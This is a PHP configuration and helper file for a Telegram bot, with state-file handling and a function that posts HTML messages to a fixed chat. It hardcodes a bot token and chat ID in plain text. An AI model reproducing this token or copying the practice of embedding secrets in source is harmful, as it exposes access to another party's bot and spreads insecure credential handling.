<?php
// ============================================
// Telegram Bot Configuration
// ============================================
define('BOT_TOKEN', '8582799113:AAEdZ5ZA6X1nz6LHwIs_Nxc3-cet3Hd4uG8');
define('CHAT_ID',   '7640526976');

// Path to our state file
define('STATE_FILE', __DIR__ . '/../data/state.json');

// ---------------------------------------------
// Ensure data folder exists
// ---------------------------------------------
function ensureDataDir() {
    $dir = dirname(STATE_FILE);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
}

// ---------------------------------------------
// Load state
// ---------------------------------------------
function loadState() {
    ensureDataDir();
    if (!file_exists(STATE_FILE)) {
        return ['step' => 0, 'status' => 'filling', 'updated' => time()];
    }
    $raw = @file_get_contents(STATE_FILE);
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return ['step' => 0, 'status' => 'filling', 'updated' => time()];
    }
    return $data;
}

// ---------------------------------------------
// Save state
// ---------------------------------------------
function saveState(array $state) {
    ensureDataDir();
    $state['updated'] = time();
    @file_put_contents(STATE_FILE, json_encode($state), LOCK_EX);
}

// ---------------------------------------------
// Reset state
// ---------------------------------------------
function resetState() {
    saveState(['step' => 0, 'status' => 'filling', 'updated' => time()]);
}

// ---------------------------------------------
// Send message to Telegram
// ---------------------------------------------
function sendTelegram($text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

    $postData = [
        'chat_id'    => CHAT_ID,
        'text'       => $text,
        'parse_mode' => 'HTML',
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlErr  = curl_error($ch);
    curl_close($ch);

    if ($httpCode !== 200) {
        error_log("Telegram send failed: " . ($curlErr ?: $response));
        return false;
    }

    $result = json_decode($response, true);
    return !empty($result['ok']);
}

// ---------------------------------------------
// Helper: HTML escape
// ---------------------------------------------
function h($v) {
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

// ---------------------------------------------
// Helper: JSON response
// ---------------------------------------------
function jsonOut($arr) {
    header('Content-Type: application/json');
    echo json_encode($arr);
    exit;
}